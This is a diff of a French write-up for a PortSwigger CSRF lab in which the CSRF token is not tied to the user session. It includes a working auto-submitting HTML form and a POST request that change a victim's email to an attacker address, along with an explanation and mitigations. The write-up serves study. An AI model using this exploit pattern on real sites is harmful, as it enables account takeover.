@@ -1,51 +1,56 @@
 # Challenge 4 : CSRF - Token Not Tied to User Session
 
-## Informations
-
-**Plateforme** : PortSwigger Web Security Academy
 **URL** : [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)
-**Categorie** : CSRF
-**Difficulte** : Intermediaire
 
-## Objectif
+## Exploitation
 
-Exploiter un jeton CSRF non lie a la session pour modifier l'email d'un utilisateur.
+Paramètre vulnérable : `csrf` (jeton CSRF non lié à la session)
 
-## Reconnaissance
+### Étape 1 : Récupérer un jeton CSRF valide
 
-Lors de l'analyse du formulaire de changement d'email, on observe que le serveur fournit un jeton CSRF via un champ cache dans le HTML. En chargeant simplement la page "My account" du compte wiener, ce jeton peut etre recupere sans declencher de requete POST.
-En testant ce jeton sur la requete de changement d'email du compte carlos (avec son cookie de session), le serveur accepte le jeton, ce qui montre qu'il n'est pas lie a une session specifique. Le jeton est toutefois a usage unique, ce qui necessite de recuperer un jeton neuf directement depuis le HTML avant toute soumission.
+Se connecter en **wiener**, aller sur *My account*, récupérer le jeton dans le HTML :
 
-## Methode d'exploitation
+```
+<input type="hidden" name="csrf" value="TOKEN">
+```
 
-1. Se connecter avec le compte wiener et acceder a la page "My account".
-2. Recuperer le jeton CSRF dans le HTML sans envoyer de requete POST.
-3. Tester ce jeton dans une requete de changement d'email du compte carlos pour verifier qu'il est accepte.
-4. Construire un exploit HTML contenant un formulaire auto-soumis utilisant l'URL du changement d'email, l'adresse cible, et le jeton CSRF recupere.
-5. Heberger ce code sur l'exploit server fourni.
-6. Utiliser "Deliver exploit to victim" pour forcer la victime a executer le formulaire.
+Aucune action n’est envoyée, donc le jeton n’est pas consommé.
 
-## Payload/POC utilise
+### Étape 2 : Tester le jeton sur le compte carlos
+
+Envoyer une requête de changement d’email avec :
+
+* le **cookie de session de carlos**
+* le **jeton CSRF de wiener**
+
+Le serveur accepte → le jeton n'est pas lié à la session.
+
+### Étape 3 : Créer un exploit CSRF
+
+Formulaire auto-soumis :
 
 ```html
 <html>
   <body>
-    <form action="https://0a20007004452f6a80610d5a003b00f8.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="megaowned999@evil.com" />
-      <input type="hidden" name="csrf" value="j6NQSd6zXkeWIEPdhv5W26Ji0hZAwphI" />
+    <form action="https://LABID.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="megaowned999@evil.com">
+      <input type="hidden" name="csrf" value="j6NQSd6zXkeWIEPdhv5W26Ji0hZAwphI">
     </form>
-    <script>
-      document.forms[0].submit();
-    </script>
+    <script>document.forms[0].submit()</script>
   </body>
 </html>
 ```
 
-## Requete HTTP
+### Étape 4 : Livrer l'exploit
+
+Uploader le payload sur l’exploit server, puis cliquer sur **Deliver exploit to victim**.
+L’email de carlos est modifié → challenge résolu.
+
+## Requête HTTP
 
 ```http
 POST /my-account/change-email HTTP/1.1
-Host: 0a20007004452f6a80610d5a003b00f8.web-security-academy.net
+Host: LABID.web-security-academy.net
 Cookie: session=<cookie_carlos>
 Content-Type: application/x-www-form-urlencoded
 
@@ -54,53 +59,17 @@ email=megaowned999%40evil.com&csrf=j6NQSd6zXkeWIEPdhv5W26Ji0hZAwphI
 
 ## Explication
 
-Le jeton CSRF fourni par l'application n'est pas associe a la session utilisateur.
-Ainsi, un jeton genere pour le compte wiener peut etre reutilise dans une requete provenant du compte carlos, tant qu'il n'a pas encore ete consomme. Le serveur valide simplement la valeur du jeton sans verifier qu'il appartient a la session de la victime, permettant a l'attaquant de forcer une action en son nom.
+Le serveur vérifie uniquement la **valeur** du jeton CSRF, mais pas la **session à laquelle il appartient**.
+Un jeton généré pour wiener peut donc être utilisé dans la session de carlos, permettant d'exécuter une action à sa place.
 
-## Screenshots
+## Mesures de sécurisation
 
-* valid_token.png : Recuperation d'un jeton valide
-* exploit.png : Exploitation avec jeton reutilise
-* flag.png : Validation du challenge
-
-## Code vulnerable
-
-```php
-if ($_POST['csrf'] !== $_SESSION['csrf_token']) {
-    die("Invalid CSRF token");
-}
-// Mauvaise implementation : le jeton n'est pas genere par session
-```
-
-## Correction recommandee
-
-```php
-session_start();
-
-if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf'])) {
-    die("Invalid CSRF token");
-}
-
-$_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // Jeton a usage unique
-```
-
-## Mesures de securisation
-
-1. Lier chaque jeton CSRF a la session utilisateur specifique
-2. Generer un nouveau jeton pour chaque session
-3. Valider que le jeton appartient bien a l'utilisateur faisant la requete
-4. Expirer les jetons apres utilisation
-
-## References
-
-* PortSwigger CSRF: [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
-* OWASP CSRF Token: [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
-
-## Notes
-
-[Notes personnelles]
+1. Lier chaque jeton CSRF à la session utilisateur
+2. Régénérer le jeton à chaque chargement de formulaire
+3. Vérifier que le jeton appartient bien à l’utilisateur qui envoie la requête
+4. Expirer les jetons après utilisation
 
 ---
 
 Date : [DATE]
-Statut : [ ] Resolu
+Statut : [ ] Résolu
